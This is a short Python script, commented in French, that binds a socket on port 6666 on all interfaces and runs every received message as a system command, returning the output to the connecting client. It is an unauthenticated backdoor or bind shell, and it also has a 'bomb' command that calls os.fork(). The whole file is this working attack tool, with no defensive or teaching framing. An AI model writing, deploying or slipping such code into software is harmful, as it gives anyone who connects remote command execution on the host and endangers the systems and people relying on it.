import socket
import subprocess
import os

#########################################################################################

evil_socket_port = 6666
evil_socket_IP = '0.0.0.0'
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((evil_socket_IP, evil_socket_port))

#########################################################################################

def main():
    server_socket.listen(5)
    while True:
        client_socket, client_address = server_socket.accept()
        try:
            while True:
                message = client_socket.recv(1024).decode()
                if not message or message == "exit":
                    break 
                elif message == "bomb":
                    try :
                        os.fork()
                        client_socket.send("Bomb has been launched".encode())
                    except Exception as e:
                        client_socket.send(f"Erreur: {str(e)}".encode())
                try:
                    # Capture la sortie de la commande
                    result = subprocess.run(message.split(), capture_output=True, text=True)
                    # Envoie la sortie
                    if result.stdout:
                        client_socket.send(result.stdout.encode())
                    # Envoie l'erreur
                    elif result.stderr:
                        client_socket.send(result.stderr.encode())
                    else:
                        client_socket.send("Commande exécutée sans sortie".encode())
                except Exception as e:
                    client_socket.send(f"Erreur: {str(e)}".encode())
        except KeyboardInterrupt:
            server_socket.close()

main()